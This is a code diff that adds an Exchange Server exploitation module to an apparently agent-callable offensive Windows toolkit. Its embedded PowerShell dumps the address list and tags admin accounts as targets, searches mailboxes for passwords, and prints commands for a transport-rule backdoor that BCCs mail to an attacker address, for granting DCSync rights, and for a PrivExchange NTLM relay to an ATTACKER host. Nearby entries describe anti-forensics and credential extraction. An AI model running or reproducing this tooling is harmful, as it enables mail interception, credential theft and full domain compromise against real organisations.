@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  exchange_abuse: {
+    description:
+      "Exchange Server exploitation — enumerate Exchange infrastructure (servers, versions, roles, virtual directories), dump Global Address List (GAL), search and export mailbox contents, plant transport rule backdoors for email interception, exploit Exchange permissions for privilege escalation (WriteDACL on domain object). Targets on-premises Exchange deployments",
+    args: "--action enum|gal|search|export|transport-rule|privesc [--server EXCHANGE_HOST] [--mailbox USER] [--query KEYWORD] [--subject SUBJECT]",
+  },
   win_hello_dump: {
     description:
       "Windows Hello credential extraction — enumerate and extract Windows Hello for Business NGC keys, PIN complexity requirements, biometric enrollment status, and FIDO2 security keys. Access NGC key containers (DPAPI-protected), extract PIN-derived keys for pass-the-certificate attacks, enumerate trust relationships between Windows Hello and Azure AD/on-prem AD",
@@ -17660,6 +17665,340 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function exchangeAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const server = argVal(args, "--server")
+  const mailbox = argVal(args, "--mailbox")
+  const query = argVal(args, "--query")
+  const subject = argVal(args, "--subject")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Exchange Server exploitation...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Exchange Server Enumeration ==="
+Write-Output ""
+# Find Exchange servers via AD
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$configDN = ([ADSI]"LDAP://RootDSE").configurationNamingContext
+$searcher.SearchRoot = [ADSI]"LDAP://$configDN"
+$searcher.Filter = "(objectCategory=msExchExchangeServer)"
+$searcher.PropertiesToLoad.AddRange(@("cn","serialNumber","msExchCurrentServerRoles","msExchProductID","networkAddress"))
+$servers = $searcher.FindAll()
+if ($servers.Count -eq 0) {
+  Write-Output "No Exchange servers found in AD configuration"
+  Write-Output "Exchange may not be deployed or you lack read access to config NC"
+  return
+}
+Write-Output "Exchange servers: $($servers.Count)"
+foreach ($s in $servers) {
+  $roles = [int]$s.Properties["msexchcurrentserverroles"][0]
+  $roleNames = @()
+  if ($roles -band 2) { $roleNames += "Mailbox" }
+  if ($roles -band 4) { $roleNames += "ClientAccess" }
+  if ($roles -band 16) { $roleNames += "UnifiedMessaging" }
+  if ($roles -band 32) { $roleNames += "HubTransport" }
+  if ($roles -band 64) { $roleNames += "EdgeTransport" }
+  Write-Output ""
+  Write-Output "  Server: $($s.Properties['cn'][0])"
+  Write-Output "  Version: $($s.Properties['serialnumber'][0])"
+  Write-Output "  Roles: $($roleNames -join ', ')"
+  $nets = $s.Properties["networkaddress"]
+  foreach ($n in $nets) {
+    if ($n -match 'ncacn_ip_tcp:(.+)') { Write-Output "  IP: $($matches[1])" }
+  }
+}
+# Find Exchange groups with domain-level permissions
+Write-Output ""
+Write-Output "=== Exchange Security Groups ==="
+$exchangeGroups = @(
+  "Exchange Windows Permissions",
+  "Exchange Trusted Subsystem",
+  "Organization Management",
+  "Exchange Servers"
+)
+foreach ($g in $exchangeGroups) {
+  $searcher.SearchRoot = [ADSI]"LDAP://$(([ADSI]'LDAP://RootDSE').defaultNamingContext)"
+  $searcher.Filter = "(&(objectCategory=group)(cn=$g))"
+  $result = $searcher.FindOne()
+  if ($result) {
+    $members = $result.Properties["member"]
+    Write-Output "  $g — $($members.Count) members"
+  }
+}
+# Check for Exchange virtual directories (OWA, EWS, etc.)
+Write-Output ""
+Write-Output "=== Virtual Directories ==="
+$vdirFilter = "(objectCategory=msExchVirtualDirectory)"
+$searcher.SearchRoot = [ADSI]"LDAP://$configDN"
+$searcher.Filter = $vdirFilter
+$vdirs = $searcher.FindAll()
+foreach ($vd in ($vdirs | Select-Object -First 20)) {
+  $cn = $vd.Properties["cn"][0]
+  $internalUrl = $vd.Properties["msexchinternalurl"]
+  $externalUrl = $vd.Properties["msexchexternalurl"]
+  if ($cn -match 'owa|ews|autodiscover|oab|mapi|activesync|ecpvirtualdirectory') {
+    Write-Output "  $cn"
+    if ($internalUrl) { Write-Output "    Internal: $($internalUrl[0])" }
+    if ($externalUrl) { Write-Output "    External: $($externalUrl[0])" }
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("Exchange servers:")) {
+      findings.push({
+        checkId: "EXCH-001",
+        provider: "winhook",
+        severity: "medium",
+        status: "INFO",
+        resource: "Exchange",
+        title: "On-premises Exchange infrastructure discovered",
+        details: r.stdout.substring(0, 500),
+        remediation: "Ensure Exchange servers are patched and hardened.",
+      })
+    }
+  }
+
+  if (action === "gal") {
+    const script = `
+Write-Output "=== Global Address List (GAL) Dump ==="
+Write-Output ""
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(&(objectCategory=person)(objectClass=user)(mail=*))"
+$searcher.PageSize = 1000
+$searcher.PropertiesToLoad.AddRange(@("sAMAccountName","mail","displayName","title","department","telephoneNumber","manager","memberOf"))
+$users = $searcher.FindAll()
+Write-Output "Mail-enabled users: $($users.Count)"
+Write-Output ""
+$admins = @()
+foreach ($u in $users) {
+  $name = $u.Properties["displayname"][0]
+  $email = $u.Properties["mail"][0]
+  $title = $u.Properties["title"]
+  $dept = $u.Properties["department"]
+  $groups = $u.Properties["memberof"]
+  $isAdmin = $groups | Where-Object { $_ -match 'Admin|Organization Management|Domain Admin|Enterprise Admin' }
+  $line = "$email | $name"
+  if ($title) { $line += " | $($title[0])" }
+  if ($dept) { $line += " | $($dept[0])" }
+  Write-Output "  $line"
+  if ($isAdmin) {
+    $admins += @{Name=$name; Email=$email; Groups=($isAdmin -join ', ')}
+  }
+}
+Write-Output ""
+Write-Output "=== High-Value Targets (Admin Group Members) ==="
+foreach ($a in $admins) {
+  Write-Output "  [!] $($a.Email) — $($a.Name)"
+  Write-Output "      Groups: $($a.Groups)"
+}
+Write-Output ""
+Write-Output "Total: $($users.Count) users, $($admins.Count) admins"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("High-Value Targets")) {
+      const adminCount = r.stdout.match(/(\d+) admins/)
+      findings.push({
+        checkId: "EXCH-002",
+        provider: "winhook",
+        severity: "medium",
+        status: "INFO",
+        resource: "Global Address List",
+        title: `GAL dumped — ${adminCount ? adminCount[1] : "multiple"} admin accounts identified`,
+        details: "Full organizational directory with email addresses, titles, and group memberships extracted",
+        remediation: "Restrict GAL access, implement address book policies.",
+      })
+    }
+  }
+
+  if (action === "search") {
+    const mailboxTarget = mailbox || "$env:USERNAME"
+    const searchQuery = query || "password"
+    const script = `
+Write-Output "=== Mailbox Search ==="
+Write-Output "Target: ${mailboxTarget}"
+Write-Output "Query: ${searchQuery}"
+Write-Output ""
+# Use EWS Managed API or COM Outlook
+try {
+  # Try EWS via PowerShell
+  $exchServer = ${server ? `'${server}'` : `([adsisearcher]'(objectCategory=msExchExchangeServer)').FindOne().Properties['networkaddress'] | Where-Object { $_ -match 'ncacn_ip_tcp:(.+)' } | ForEach-Object { $matches[1] }`}
+  $ewsUrl = "https://$exchServer/EWS/Exchange.asmx"
+  Write-Output "EWS URL: $ewsUrl"
+  Write-Output ""
+  # Search using EWS SOAP
+  $cred = [System.Net.CredentialCache]::DefaultNetworkCredentials
+  [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+  $searchXml = @"
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
+  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
+  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header>
+    <t:RequestServerVersion Version="Exchange2013" />
+  </soap:Header>
+  <soap:Body>
+    <m:FindItem Traversal="Shallow">
+      <m:ItemShape><t:BaseShape>Default</t:BaseShape></m:ItemShape>
+      <m:Restriction>
+        <t:Contains ContainmentMode="Substring" ContainmentComparison="IgnoreCase">
+          <t:FieldURI FieldURI="item:Subject" />
+          <t:Constant Value="${searchQuery}" />
+        </t:Contains>
+      </m:Restriction>
+      <m:ParentFolderIds>
+        <t:DistinguishedFolderId Id="inbox" />
+      </m:ParentFolderIds>
+    </m:FindItem>
+  </soap:Body>
+</soap:Envelope>
+"@
+  $response = Invoke-WebRequest -Uri $ewsUrl -Method POST -Body $searchXml -ContentType "text/xml" -Credential $cred -UseDefaultCredentials
+  if ($response.StatusCode -eq 200) {
+    $xml = [xml]$response.Content
+    $items = $xml.SelectNodes("//*[local-name()='Message']")
+    Write-Output "[+] Found $($items.Count) matching messages"
+    foreach ($item in ($items | Select-Object -First 20)) {
+      $subj = $item.SelectSingleNode("*[local-name()='Subject']")
+      $from = $item.SelectSingleNode("*[local-name()='From']/*[local-name()='Mailbox']/*[local-name()='EmailAddress']")
+      $date = $item.SelectSingleNode("*[local-name()='DateTimeSent']")
+      Write-Output "  Subject: $($subj.InnerText)"
+      Write-Output "  From: $($from.InnerText)"
+      Write-Output "  Date: $($date.InnerText)"
+      Write-Output ""
+    }
+  }
+} catch {
+  Write-Output "EWS search failed: $_"
+  Write-Output ""
+  Write-Output "Alternative: Use Outlook COM (if Outlook is installed)"
+  try {
+    $outlook = New-Object -ComObject Outlook.Application
+    $ns = $outlook.GetNamespace("MAPI")
+    $inbox = $ns.GetDefaultFolder(6)
+    $items = $inbox.Items.Restrict("[Subject] = '*${searchQuery}*'")
+    Write-Output "[+] Found $($items.Count) matching messages via Outlook"
+    foreach ($item in ($items | Select-Object -First 20)) {
+      Write-Output "  Subject: $($item.Subject)"
+      Write-Output "  From: $($item.SenderEmailAddress)"
+      Write-Output "  Date: $($item.ReceivedTime)"
+      Write-Output ""
+    }
+  } catch {
+    Write-Output "Outlook COM also failed: $_"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "transport-rule") {
+    const subjectFilter = subject || "password reset"
+    const script = `
+Write-Output "=== Exchange Transport Rule Backdoor ==="
+Write-Output ""
+Write-Output "WARNING: This creates a mail flow rule that BCC's matching emails"
+Write-Output ""
+# Check if Exchange Management Shell is available
+$snapin = Get-PSSnapin -Registered -Name Microsoft.Exchange.Management.PowerShell.SnapIn -ErrorAction SilentlyContinue
+if (-not $snapin) {
+  Write-Output "Exchange Management Shell not available on this host"
+  Write-Output "This action must be run on the Exchange server or with remote PS session"
+  Write-Output ""
+  Write-Output "Manual command (run on Exchange server):"
+  Write-Output '  New-TransportRule -Name "Audit Rule" -SubjectContainsWords "${subjectFilter}" -BlindCopyTo "attacker@domain.com"'
+  return
+}
+Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn
+# List existing transport rules
+Write-Output "--- Existing Transport Rules ---"
+$rules = Get-TransportRule -ErrorAction SilentlyContinue
+foreach ($r in $rules) {
+  Write-Output "  $($r.Name) — State: $($r.State) — Priority: $($r.Priority)"
+}
+Write-Output ""
+Write-Output "To create a BCC rule:"
+Write-Output '  New-TransportRule -Name "Security Audit" -SubjectContainsWords "password","credentials","vpn" -BlindCopyTo "your-mailbox@domain.com"'
+Write-Output ""
+Write-Output "To create a journal rule (capture ALL mail):"
+Write-Output '  New-JournalRule -Name "Compliance" -JournalEmailAddress "journal@domain.com" -Scope Global -Enabled $true'
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "privesc") {
+    const script = `
+Write-Output "=== Exchange Privilege Escalation ==="
+Write-Output ""
+Write-Output "--- Exchange Windows Permissions Group ---"
+Write-Output "Members of this group have WriteDACL on the domain object"
+Write-Output "This allows granting DCSync rights to any user"
+Write-Output ""
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(&(objectCategory=group)(cn=Exchange Windows Permissions))"
+$ewp = $searcher.FindOne()
+if ($ewp) {
+  $members = $ewp.Properties["member"]
+  Write-Output "Exchange Windows Permissions members: $($members.Count)"
+  foreach ($m in $members) {
+    $cn = ($m -split ',')[0] -replace 'CN=',''
+    Write-Output "  $cn"
+  }
+  Write-Output ""
+  Write-Output "--- Exploitation ---"
+  Write-Output "If you control any member of this group:"
+  Write-Output "  1. Grant DCSync rights to your controlled account:"
+  Write-Output '     Add-ADPermission -Identity "DC=domain,DC=com" -User YOURUSER -ExtendedRights "Replicating Directory Changes","Replicating Directory Changes All"'
+  Write-Output "  2. DCSync: winhook dcsync --target krbtgt"
+  Write-Output ""
+  Write-Output "--- Exchange Trusted Subsystem ---"
+  $searcher.Filter = "(&(objectCategory=group)(cn=Exchange Trusted Subsystem))"
+  $ets = $searcher.FindOne()
+  if ($ets) {
+    Write-Output "Exchange Trusted Subsystem is member of Exchange Windows Permissions"
+    Write-Output "Exchange servers are members of Exchange Trusted Subsystem"
+    Write-Output "Compromising ANY Exchange server → WriteDACL on domain → DCSync → full domain compromise"
+  }
+} else {
+  Write-Output "Exchange Windows Permissions group not found"
+  Write-Output "Exchange may not be installed or you lack read access"
+}
+# Check for NTLM relay to Exchange
+Write-Output ""
+Write-Output "--- Exchange NTLM Relay (PrivExchange) ---"
+Write-Output "Exchange servers authenticate to any host via NTLM when triggered"
+Write-Output "Relay this auth to LDAP to grant DCSync rights"
+Write-Output ""
+Write-Output "Steps:"
+Write-Output "  1. Set up relay: winhook ntlm_relay --action relay --relay-to DC --service ldap"
+Write-Output "  2. Trigger Exchange auth: Subscribe to push notification"
+Write-Output '     $body = @{URL="http://ATTACKER:PORT/";AuthenticationMethod="Ntlm"}'
+Write-Output "  3. Exchange authenticates → relay to LDAP → grant DCSync → dump domain"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stdout.includes("WriteDACL on domain")) {
+      findings.push({
+        checkId: "EXCH-003",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "Exchange Permissions",
+        title: "Exchange has WriteDACL on domain — privesc to domain admin possible",
+        details: "Exchange Windows Permissions group members can grant DCSync rights on the domain object",
+        remediation: "Remove unnecessary permissions from Exchange security groups, apply Split Permissions model.",
+      })
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function winHelloDump(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "enum"
   const user = argVal(args, "--user")
@@ -23503,6 +23842,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   machine_account: machineAccount,
   bitlocker_keys: bitlockerKeys,
   win_hello_dump: winHelloDump,
+  exchange_abuse: exchangeAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
